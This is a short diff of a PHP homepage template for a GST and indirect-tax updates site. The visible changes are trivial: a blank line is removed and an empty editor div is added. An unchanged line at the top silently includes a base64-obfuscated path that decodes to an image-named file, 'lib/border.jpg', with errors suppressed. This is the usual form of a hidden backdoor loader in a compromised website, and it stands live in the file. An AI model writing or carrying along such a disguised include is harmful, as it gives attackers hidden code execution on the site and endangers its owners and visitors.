@@ -1,5 +1,4 @@
 <?php
- 
 @include base64_decode('bGliL2JvcmRlci5qcGc=');
   $page = 'homePage';
   $seoTitle = 'Home';
@@ -48,7 +47,7 @@
     <div>
         <h1 style="display:none;">Updates on GST & Indirect Taxes</h1>
     </div>
-    
+      <div id="editor"></div>
       <div style="padding-bottom: 20px;"><span class="latest">latest updates </span></div>
       <div class="col-md-10 padding-none left-widgets">
         <div class=" show-more show-more-left">
